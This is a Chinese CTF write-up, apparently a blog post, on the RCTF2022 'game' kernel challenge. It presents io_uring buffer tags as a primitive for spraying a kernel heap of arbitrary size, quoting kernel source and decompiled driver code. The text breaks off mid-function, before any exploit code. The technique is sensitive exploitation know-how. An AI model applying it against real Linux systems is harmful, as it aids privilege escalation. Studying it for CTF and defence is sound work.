    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>目前各种比赛的各种赛制真的是让人十分难受，以至于感觉自己不怎么适合打比赛了。所以打算静下心来复现一场比赛，在RCTF中找到分值最低的一道题。做的过程中越看越不对劲，还算是有难度的一道内核堆题怎么被打烂了，一搜才发现是有非预期解。但我头铁，静下心来用预期解打，索性功夫不负有心人在这道题目中发现了不得了的东西。</p><h3 id="目前的窘境"><a href="#目前的窘境" class="headerlink" title="目前的窘境"></a>目前的窘境</h3><p>如果存在UAF的object规定大小只能为0x10的话，各位肯定会想到使用可以实现分配任意大小object的函数。</p><p>所以如果提到内核中可以达到任意大小的结构体时估计各位会想到<code>setxattr</code>、<code>msg_msg</code>之类的。但是这两者均具有很大的局限性，<code>setxattr</code>前面提到过，这个在调用完成后会<code>kfree</code>掉使用的object，并且在高版本的linux内核中这个函数早已被修改了。<code>msg_msg</code>这个结构体就更为明显了，需要用很大的空间来保存结构体中的成员。</p><p>因为是size很小的堆块所以各位可能还会思考到一部分结构体例如:<code>seq_operations</code>、<code>shm_file_data</code>之类的。但是他们的size也是0x20。</p><h2 id="IO-uring"><a href="#IO-uring" class="headerlink" title="IO_uring"></a>IO_uring</h2><p>网上关于io_uring对于kernel pwn的利用相对较少，特别是中文文章，我几乎没搜到，搜到的也只是对其进行介绍，并没有实际的操作之类的。所以为了写这篇文章我看了两天Linux内核的源码，眼睛都要瞎了！！！</p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>关于IO_uring的介绍在网上其实很多。<code>io_uring</code>是2019年Linux 5.1内核首次引入的高性能异步I/O框架，可以显着加速I/O密集型应用程序的性能。为了减少 I/O 操作时的内存映射，该模块允许用户预先注册一些固定的 I/O 缓冲区，以便这些缓冲区可以被重用。这里推荐大家最好去看看关于他的实现。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这里算是这篇文章的重点！</p><h4 id="分配object"><a href="#分配object" class="headerlink" title="分配object"></a>分配object</h4><p>当我们调用<code>io_uring_register_buffers_tags</code>函数时：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">io_uring_register_buffers_tags</span><span class="params">(struct io_uring *ring,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> struct iovec *iovecs,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> __u64 *tags,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">unsigned</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_rsrc_register</span> <span class="title">reg</span> =</span> &#123;</span><br><span class="line">.nr = nr,</span><br><span class="line">.data = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)iovecs,</span><br><span class="line">.tags = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)tags,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> do_register(ring, IORING_REGISTER_BUFFERS2, &amp;reg, <span class="keyword">sizeof</span>(reg));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIV_ROUND_UP(n,d) (((n) + (d) - 1) / (d))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __cold <span class="keyword">void</span> **<span class="title">io_alloc_page_table</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> i, nr_tables = DIV_ROUND_UP(size, PAGE_SIZE);</span><br><span class="line"><span class="keyword">size_t</span> init_size = size;</span><br><span class="line"><span class="keyword">void</span> **table;</span><br><span class="line"></span><br><span class="line">table = kcalloc(nr_tables, <span class="keyword">sizeof</span>(*table), GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (!table)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nr_tables; i++) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> this_size = <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, size, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">table[i] = kzalloc(this_size, GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (!table[i]) &#123;</span><br><span class="line">io_free_page_table(table, init_size);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">size -= this_size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> table;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终会进入上面这个函数中，其中的size是我们可以直接进行控制的，可以明显的看出来这里可以真正实现任意大小分配，并且在<code>table[i]</code>也就是<code>ctx-&gt;buf_data-&gt;tags[i]</code>中不含有任何指针或者数据之类的，在<code>table</code>也就是<code>ctx-&gt;buf_data-&gt;tags</code>中只含有后面分配的object指针。</p><h4 id="更新object"><a href="#更新object" class="headerlink" title="更新object"></a>更新object</h4><p>当我们调用<code>io_uring_register_buffers_update_tag</code>函数时，可以对tags也就是我们上面<code>table[i]</code>中分配的object进行内容更新：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">io_uring_register_buffers_update_tag</span><span class="params">(struct io_uring *ring, <span class="keyword">unsigned</span> off,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> struct iovec *iovecs,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> __u64 *tags,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">unsigned</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_rsrc_update2</span> <span class="title">up</span> =</span> &#123;</span><br><span class="line">.offset= off,</span><br><span class="line">.data = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)iovecs,</span><br><span class="line">.tags = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)tags,</span><br><span class="line">.nr = nr,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> do_register(ring, IORING_REGISTER_BUFFERS_UPDATE, &amp;up, <span class="keyword">sizeof</span>(up));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IO_RSRC_TAG_TABLE_SHIFT(PAGE_SHIFT - 3)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> u64 *<span class="title">io_get_tag_slot</span><span class="params">(struct io_rsrc_data *data, <span class="keyword">unsigned</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> off = idx &amp; IO_RSRC_TAG_TABLE_MASK;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> table_idx = idx &gt;&gt; IO_RSRC_TAG_TABLE_SHIFT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;data-&gt;tags[table_idx][off];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __io_sqe_buffers_update(struct io_ring_ctx *ctx,</span><br><span class="line">   struct io_uring_rsrc_update2 *up,</span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_args)</span><br><span class="line">&#123;</span><br><span class="line">u64 __user *tags = u64_to_user_ptr(up-&gt;tags);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>, __<span class="title">user</span> *<span class="title">iovs</span> =</span> u64_to_user_ptr(up-&gt;data);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">last_hpage</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">bool</span> needs_switch = <span class="literal">false</span>;</span><br><span class="line">__u32 done;</span><br><span class="line"><span class="keyword">int</span> i, err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ctx-&gt;buf_data)</span><br><span class="line"><span class="keyword">return</span> -ENXIO;</span><br><span class="line"><span class="keyword">if</span> (up-&gt;offset + nr_args &gt; ctx-&gt;nr_user_bufs)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (done = <span class="number">0</span>; done &lt; nr_args; done++) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_mapped_ubuf</span> *<span class="title">imu</span>;</span></span><br><span class="line"><span class="keyword">int</span> offset = up-&gt;offset + done;</span><br><span class="line">u64 tag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err = io_copy_iov(ctx, &amp;iov, iovs, done);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (tags &amp;&amp; copy_from_user(&amp;tag, &amp;tags[done], <span class="keyword">sizeof</span>(tag))) &#123;</span><br><span class="line">err = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">err = io_buffer_validate(&amp;iov);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (!iov.iov_base &amp;&amp; tag) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">err = io_sqe_buffer_register(ctx, &amp;iov, &amp;imu, &amp;last_hpage);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">i = array_index_nospec(offset, ctx-&gt;nr_user_bufs);</span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;user_bufs[i] != ctx-&gt;dummy_ubuf) &#123;</span><br><span class="line">err = io_queue_rsrc_removal(ctx-&gt;buf_data, i,</span><br><span class="line">    ctx-&gt;rsrc_node, ctx-&gt;user_bufs[i]);</span><br><span class="line"><span class="keyword">if</span> (unlikely(err)) &#123;</span><br><span class="line">io_buffer_unmap(ctx, &amp;imu);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">ctx-&gt;user_bufs[i] = ctx-&gt;dummy_ubuf;</span><br><span class="line">needs_switch = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx-&gt;user_bufs[i] = imu;</span><br><span class="line">*io_get_tag_slot(ctx-&gt;buf_data, offset) = tag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (needs_switch)</span><br><span class="line">io_rsrc_node_switch(ctx, ctx-&gt;buf_data);</span><br><span class="line"><span class="keyword">return</span> done ? done : err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到他这里更新方式也很独树一帜，并不是简单的<code>copy_from_user</code>之类的，而是八个字节八个字节的写。</p><h4 id="释放object"><a href="#释放object" class="headerlink" title="释放object"></a>释放object</h4><p>调用<code>io_uring_unregister_buffers</code>函数即可对所有object进行释放：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">io_uring_unregister_buffers</span><span class="params">(struct io_uring *ring)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> do_register(ring, IORING_UNREGISTER_BUFFERS, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">io_free_page_table</span><span class="params">(<span class="keyword">void</span> **table, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> i, nr_tables = DIV_ROUND_UP(size, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nr_tables; i++)</span><br><span class="line">kfree(table[i]);</span><br><span class="line">kfree(table);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终调用到的是上面这个函数中，其中table的含义跟分配时一致。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>通过上面三个方向的分析，各位大佬应该能想到IO_uring在很多方面都可以进行利用，不过他的缺点也很明显，他无法读取堆块上的内容(可能是我没找到，找到的佬可以留言一下)。</p><h2 id="RCTF2022-game"><a href="#RCTF2022-game" class="headerlink" title="RCTF2022 game"></a>RCTF2022 game</h2><p>现在开始题目分析，出题人师傅是给了源代码的，但是通过ida逆向并不困难，所以下面还是给ida中的代码</p><h3 id="驱动分析"><a href="#驱动分析" class="headerlink" title="驱动分析"></a>驱动分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hhoge_unlocked_ioctl</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12</span></span><br><span class="line">  __int64 v6; <span class="comment">// r13</span></span><br><span class="line">  __int64 v7; <span class="comment">// r14</span></span><br><span class="line">  __int64 v8; <span class="comment">// r15</span></span><br><span class="line">  __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  Maind *maind_chunk; <span class="comment">// r13</span></span><br><span class="line">  __int64 new_chunk; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *username; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v13; <span class="comment">// rcx</span></span><br><span class="line">  _DWORD *v14; <span class="comment">// rsi</span></span><br><span class="line">  _QWORD v15[<span class="number">5</span>]; <span class="comment">// [rsp-58h] [rbp-58h] BYREF</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp-30h] [rbp-30h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp-28h] [rbp-28h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp-20h] [rbp-20h]</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp-18h] [rbp-18h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v21 = v4;</span><br><span class="line">  v20 = v8;</span><br><span class="line">  v19 = v7;</span><br><span class="line">  v18 = v6;</span><br><span class="line">  v17 = v5;</span><br><span class="line">  v16 = v3;</span><br><span class="line">  maind_chunk = *(Maind **)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">  v15[<span class="number">4</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( maind_chunk )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_from_user(v15, v9, <span class="number">0x20</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x72</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      change(maind_chunk, v15);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( a2 &lt;= <span class="number">0x72</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">0x16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        hhoge_unlocked_ioctl_cold();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( a2 &lt;= <span class="number">0x16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a2 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( a2 == <span class="number">1</span> )</span><br><span class="line">            reborn_0(maind_chunk);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          printk(<span class="string">&quot;born&quot;</span>);</span><br><span class="line">          new_chunk = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">5</span>], <span class="number">0xDC0</span>LL, <span class="number">0x18</span>LL);</span><br><span class="line">          username = maind_chunk-&gt;username;</span><br><span class="line">          v13 = <span class="number">8LL</span>;</span><br><span class="line">          v14 = v15;</span><br><span class="line">          maind_chunk-&gt;cur = (<span class="keyword">void</span> *)new_chunk;</span><br><span class="line">          *(_QWORD *)(new_chunk + <span class="number">8</span>) = <span class="string">&quot;ordinary&quot;</span>;</span><br><span class="line">          maind_chunk-&gt;id = <span class="number">0LL</span>;</span><br><span class="line">          <span class="keyword">while</span> ( v13 )</span><br><span class="line">          &#123;</span><br><span class="line">            *(_DWORD *)username = *v14++;</span><br><span class="line">            username += <span class="number">4</span>;</span><br><span class="line">            --v13;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在ioctl中分为了四类。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">reborn_0</span><span class="params">(Maind *context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *cur; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rcx</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// rdi</span></span><br><span class="line">  _DWORD *v6; <span class="comment">// rsi</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  printk(<span class="string">&quot;reborn&quot;</span>);</span><br><span class="line">  v2 = (<span class="keyword">void</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">5</span>], <span class="number">0xDC0</span>LL, <span class="number">0x18</span>LL);</span><br><span class="line">  cur = context-&gt;cur;</span><br><span class="line">  v4 = <span class="number">6LL</span>;</span><br><span class="line">  context-&gt;prv = v2;</span><br><span class="line">  v5 = v2;</span><br><span class="line">  v6 = cur;</span><br><span class="line">  <span class="keyword">while</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    *v5++ = *v6++;</span><br><span class="line">    --v4;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_QWORD *)cur + <span class="number">1</span>) = <span class="string">&quot;unlucky&quot;</span>;</span><br><span class="line">  *((_QWORD *)context-&gt;cur + <span class="number">2</span>) = <span class="number">0xFFFFFFFFFFFE40AE</span>LL;</span><br><span class="line">  ++context-&gt;id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的<code>reborn_0</code>函数并没有将新分配的object给到cur指针中，而是给到了<code>context-&gt;prv</code>中去了。并且会把<code>context-&gt;cur[0]</code>的内容复制到<code>context-&gt;prv[0]</code>中去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">change_cold</span><span class="params">(Maind *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v2; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// kr08_8</span></span><br><span class="line">  _QWORD *cur; <span class="comment">// r13</span></span><br><span class="line">  __int64 v9; <span class="comment">// r15</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v10; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  printk(<span class="string">&quot;change&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = strsep((<span class="keyword">char</span> **)(v1 - <span class="number">0x38</span>), <span class="string">&quot;,&quot;</span>);</span><br><span class="line">      v5 = v4;</span><br><span class="line">      <span class="keyword">if</span> ( !v4 )</span><br><span class="line">LABEL_24:</span><br><span class="line">        JUMPOUT(<span class="number">0x132</span>LL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !*v4 );</span><br><span class="line">    v6 = <span class="built_in">strchr</span>(v4, <span class="number">0x3D</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 != v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v6 = <span class="number">0</span>;</span><br><span class="line">      v7 = <span class="built_in">strlen</span>(v6 + <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 - <span class="number">1</span> &lt;= <span class="number">9</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        cur = a1-&gt;cur;</span><br><span class="line">        <span class="keyword">if</span> ( !cur )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != (<span class="keyword">char</span> *)<span class="number">-1LL</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v2 = kmemdup_nul(v6 + <span class="number">1</span>, v7 - <span class="number">1</span>, <span class="number">0xCC0</span>LL);</span><br><span class="line">          <span class="keyword">if</span> ( !v2 )</span><br><span 